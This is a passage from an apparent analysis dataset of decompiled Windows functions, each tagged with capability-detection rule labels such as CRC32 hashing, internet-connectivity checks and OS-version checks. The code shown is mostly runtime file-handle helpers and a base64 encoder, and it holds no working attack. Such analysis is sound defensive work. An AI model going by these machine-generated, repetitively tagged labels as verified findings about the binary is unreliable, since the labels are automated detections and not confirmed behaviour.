pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2;\n            var_18h = var_18h + 1;\n        } while (var_18h < 2);\n        for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n        }\n        if (var_8h == 1) {\n            iVar6 = var_ch + (pcVar11 & 0xfffffffe);\n            *(var_ch + 0x154) = iVar6;\n            iVar6 = fcn.0045c065(iVar6, var_10h - pcVar11 >> 1, ppcVar4[0x55]);\n            if (iVar6 != 0) goto code_r0x0045e0d0;\n        }\n        piVar9 = ppcVar4[0x55];\n        piVar1 = piVar9 + 1;\n        do {\n            iVar3 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar3 != 0);\n        for (pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n        }\n        if (var_8h == 1) {\n            iVar6 = var_ch + (pcVar11 & 0xfffffffe);\n            *(var_ch + 0x158) = iVar6;\n            iVar6 = fcn.0045c065(iVar6, var_10h - pcVar11 >> 1, ppcVar4[0x56]);\n            if (iVar6 != 0) goto code_r0x0045e0d0;\n        }\n        piVar9 = ppcVar4[0x56];\n        piVar1 = piVar9 + 1;\n        do {\n            iVar3 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar3 != 0);\n        for (pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n        }\n        if (var_8h == 1) {\n            iVar6 = var_ch + (pcVar11 & 0xfffffffe);\n            *(var_ch + 0x15c) = iVar6;\n            iVar6 = fcn.0045c065(iVar6, var_10h - pcVar11 >> 1, ppcVar4[0x57]);\n            if (iVar6 != 0) goto code_r0x0045e0d0;\n        }\n        piVar9 = ppcVar4[0x57];\n        piVar1 = piVar9 + 1;\n        do {\n            iVar3 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar3 != 0);\n        for (pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n        }\n        if (var_8h == 1) {\n            iVar6 = var_ch + (pcVar11 & 0xfffffffe);\n            *(var_ch + 0x160) = iVar6;\n            iVar6 = fcn.0045c065(iVar6, var_10h - pcVar11 >> 1, ppcVar4[0x58]);\n            if (iVar6 != 0) {\ncode_r0x0045e0d0:\n                fcn.00455a0a(0, 0, 0, 0, 0);\n                pcVar5 = swi(3);\n                iVar6 = (*pcVar5)();\n                return iVar6;\n            }\n        }\n        piVar9 = ppcVar4[0x58];\n        piVar1 = piVar9 + 1;\n        do {\n            iVar3 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar3 != 0);\n        var_8h = var_8h + 1;\n        pcVar11 = pcVar11 + ((piVar9 - piVar1 >> 1) + 1) * 2;\n    } while (var_8h < 2);\n    if (var_1ch != '\\0') {\n        *(var_28h + 0x350) = *(var_28h + 0x350) & 0xfffffffd;\n    }\n    return var_ch;\n}\n",
        "token_count": 4484
    },
    "0046a8be": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0046a8be(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t arg_8h_00;\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t unaff_EBP;\n    uint uVar4;\n    uint unaff_retaddr;\n    uint var_1ch;\n    uint var_4h;\n    uint noname_1;\n    \n    noname_1 = 0xc;\n    fcn.0043b410();\n    uVar4 = 0;\n    *(unaff_EBP + -0x1c) = 0;\n    fcn.0046805a(**(unaff_EBP + 8));\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = ***(unaff_EBP + 0xc);\n    if ((*(*((arg_8h_00 >> 6) * 4 + 0x495e20) + 0x28 + (arg_8h_00 & 0x3f) * 0x30) & 1) != 0) {\n        uVar1 = fcn.00468131(arg_8h_00);\n        iVar2 = (*_sym.imp.KERNEL32.dll_FlushFileBuffers)(uVar1);\n        if (iVar2 != 0) goto code_r0x0046a92e;\n        puVar3 = fcn.0045651b();\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        *puVar3 = uVar4;\n    }\n    puVar3 = fcn.0045652e();\n    *puVar3 = 9;\n    uVar4 = 0xffffffff;\ncode_r0x0046a92e:\n    *(unaff_EBP + -0x1c) = uVar4;\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0046a94a(0x48f378, noname_1, unaff_retaddr);\n    fcn.0043b456();\n    return;\n}\n",
        "token_count": 484
    },
    "0046af80": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0046af80(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t lpCriticalSection;\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0043b410(0x48f398, 0x10);\n    lpCriticalSection = *(unaff_EBP + 8);\n    if (lpCriticalSection == 0xfffffffe) {\n        puVar1 = fcn.0045651b();\n        *puVar1 = 0;\n        puVar1 = fcn.0045652e();\n        *puVar1 = 9;\n    }\n    else {\n        if ((-1 < lpCriticalSection) && (lpCriticalSection < *0x496020)) {\n            iVar3 = (lpCriticalSection & 0x3f) * 0x30;\n            *(unaff_EBP + -0x20) = iVar3;\n            if ((*(*((lpCriticalSection >> 6) * 4 + 0x495e20) + 0x28 + iVar3) & 1) != 0) {\n                fcn.0046805a(lpCriticalSection);\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n                *(unaff_EBP + -4) = 0;\n                if ((*(*((lpCriticalSection >> 6) * 4 + 0x495e20) + 0x28 + *(unaff_EBP + -0x20)) & 1) == 0) {\n                    puVar1 = fcn.0045652e();\n                    *puVar1 = 9;\n                    puVar1 = fcn.0045651b();\n                    *puVar1 = 0;\n                }\n                else {\n                    uVar2 = fcn.0046b068(lpCriticalSection, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar2;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.0046b03f();\n                goto code_r0x0046b062;\n            }\n        }\n        puVar1 = fcn.0045651b();\n        *puVar1 = 0;\n        puVar1 = fcn.0045652e();\n        *puVar1 = 9;\n        fcn.004559dd();\n    }\ncode_r0x0046b062:\n    fcn.0043b456();\n    return;\n}\n",
        "token_count": 606
    },
    "0046ed4b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0046ed4b(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t arg_8h_00;\n    uint uVar1;\n    uint *puVar2;\n    int32_t unaff_EBP;\n    uint unaff_retaddr;\n    uint var_1ch;\n    uint var_4h;\n    uint noname_1;\n    \n    noname_1 = 0xc;\n    fcn.0043b410();\n    *(unaff_EBP + -0x1c) = 0;\n    fcn.0046805a(**(unaff_EBP + 8));\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = ***(unaff_EBP + 0xc);\n    if ((*(*((arg_8h_00 >> 6) * 4 + 0x495e20) + 0x28 + (arg_8h_00 & 0x3f) * 0x30) & 1) == 0) {\n        puVar2 = fcn.0045652e();\n        *puVar2 = 9;\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = fcn.0046ee5c(arg_8h_00);\n    }\n    *(unaff_EBP + -0x1c) = uVar1;\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0046edc1(0x48f3f8, noname_1, unaff_retaddr);\n    fcn.0043b456();\n    return;\n}\n",
        "token_count": 382
    },
    "0046edcd": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.0046edcd(uint32_t arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint32_t var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    if (arg_8h == 0xfffffffe) {\n        puVar1 = fcn.0045651b();\n        *puVar1 = 0;\n        puVar1 = fcn.0045652e();\n        *puVar1 = 9;\n    }\n    else {\n        if (((-1 < arg_8h) && (arg_8h < *0x496020)) &&\n           ((*(*((arg_8h >> 6) * 4 + 0x495e20) + 0x28 + (arg_8h & 0x3f) * 0x30) & 1) != 0)) {\n            var_ch = &arg_8h;\n            var_8h = arg_8h;\n            var_10h = arg_8h;\n            uVar2 = fcn.0046ed4b(&var_10h, &var_ch);\n            return uVar2;\n        }\n        puVar1 = fcn.0045651b();\n        *puVar1 = 0;\n        puVar1 = fcn.0045652e();\n        *puVar1 = 9;\n        fcn.004559dd();\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 349
    },
    "00401800": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401800(int32_t *param_1)\n\n{\n    uint in_stack_ffffffec;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*param_1 == 0) {\n        in_stack_ffffffec = 0;\n        fcn.004214e9(0);\n        if (*param_1 == 0) {\n            *0x494f0c = *0x494f0c + 1;\n            *param_1 = *0x494f0c;\n        }\n        fcn.00421541();\n    }\n    fcn.0043a2e7(in_stack_ffffffec);\n    return;\n}\n",
        "token_count": 156
    },
    "00401990": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401990(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470160;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    if ((*(param_1 + 4) != 0) && (puVar2 = (**(**(param_1 + 4) + 8))(uVar1),  puVar2 != NULL)) {\n        (***puVar2)(1);\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 218
    },
    "00401a10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nint32_t __cdecl fcn.00401a10(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470160;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    if (*(in_ECX + 4) != *(arg_8h + 4)) {\n        puVar2 = (**(**(in_ECX + 4) + 8))(uVar1);\n        if (puVar2 == NULL) {\n            var_1ch = 0;\n        }\n        else {\n            var_1ch = (***puVar2)(1);\n        }\n        *(in_ECX + 4) = *(arg_8h + 4);\n        (**(**(in_ECX + 4) + 4))(uVar1, var_1ch);\n    }\n    *in_FS_OFFSET = var_ch;\n    return in_ECX;\n}\n",
        "token_count": 320
    },
    "00402210": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402210(uint arg_8h, uint arg_ch)\n\n{\n    bool bVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    char *pcVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    uint *arg_8h_00;\n    uint arg_ch_00;\n    uint var_40h;\n    uint *var_3ch;\n    uint32_t var_38h;\n    uint *var_34h;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint32_t var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    uint *var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    var_14h = 0;\n    var_18h = 0;\n    var_1ch = NULL;\n    arg_ch_00 = 0;\n    uVar2 = fcn.00402440(arg_8h);\n    fcn.004051d0(uVar2, arg_ch_00);\n    var_20h = fcn.00404d90();\n    fcn.00401b10(4);\n    arg_8h_00 = &var_10h;\n    fcn.004052a0(arg_8h_00);\n    while( true ) {\n        var_2ch = var_20h;\n        iVar3 = var_20h + -1;\n        if (var_20h == 0) break;\n        uVar2 = 0;\n        puVar6 = &var_40h;\n        var_20h = iVar3;\n        fcn.00404be0(puVar6);\n        puVar4 = fcn.00404c30(puVar6, uVar2);\n        *(&var_8h + var_14h) = *puVar4;\n        var_14h = var_14h + 1;\n        if (var_14h == 3) {\n            fcn.00402460(&var_ch, &var_8h);\n            for (var_14h = 0; var_14h < 4; var_14h = var_14h + 1) {\n                var_30h = var_1ch;\n                pcVar5 = fcn.00405270(var_1ch);\n                *pcVar5 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"[*(&var_ch + var_14h)];\n                var_1ch = var_1ch + 1;\n            }\n            var_14h = 0;\n        }\n    }\n    var_20h = iVar3;\n    if (var_14h != 0) {\n        for (var_18h = var_14h; var_18h < 3; var_18h = var_18h + 1) {\n            var_24h = var_18h;\n            if (2 < var_18h) {\n                fcn.0043a41b();\n            }\n            *(&var_8h + var_24h) = 0;\n        }\n        fcn.00402460(&var_ch, &var_8h);\n        for (var_18h = 0; var_18h < var_14h + 1; var_18h = var_18h + 1) {\n            var_34h = var_1ch;\n            arg_8h_00 = var_1ch;\n            pcVar5 = fcn.00405270(var_1ch);\n            *pcVar5 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"[*(&var_ch + var_18h)];\n            var_1ch = var_1ch + 1;\n        }\n        while( true ) {\n            var_38h = var_14h;\n            uVar7 = var_14h + 1;\n            bVar1 = 2 < var_14h;\n            var_14h = uVar7;\n            if (bVar1) break;\n            var_3ch = var_1ch;\n            arg_8h_00 = var_1ch;\n            puVar4 = fcn.00405270(var_1ch);\n            *puVar4 = 0x3d;\n            var_1ch = var_1ch + 1;\n        }\n    }\n    puVar6 = fcn.00404d90();\n    var_28h = var_1ch == puVar6;\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 1064
    },
    "00402940": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00402940(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint in_ECX;\n    int32_t *in_FS_OFFSET;\n    char *in_stack_fffffd30;\n    uint *puVar4;\n    uint arg_10h;\n    uint var_27ch;\n    uint var_264h;\n    uint var_24ch;\n    uint var_234h;\n    uint var_21ch;\n    uint var_204h;\n    uint var_1ech;\n    uint var_1d4h;\n    uint var_1bch;\n    uint var_1a4h;\n    uint var_18ch;\n    uint var_174h;\n    uint var_15ch;\n    uint var_144h;\n    uint var_12ch;\n    uint var_114h;\n    uint var_fch;\n    uint var_e4h;\n    uint var_cch;\n    uint var_b4h;\n    uint var_9ch;\n    uint var_84h;\n    uint32_t var_6ah;\n    uint var_64h;\n    uint var_60h;\n    uint var_48h;\n    uint var_30h;\n    uint var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x4701e0;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00402eb0(in_ECX);\n    var_6ah._0_1_ = 0;\n    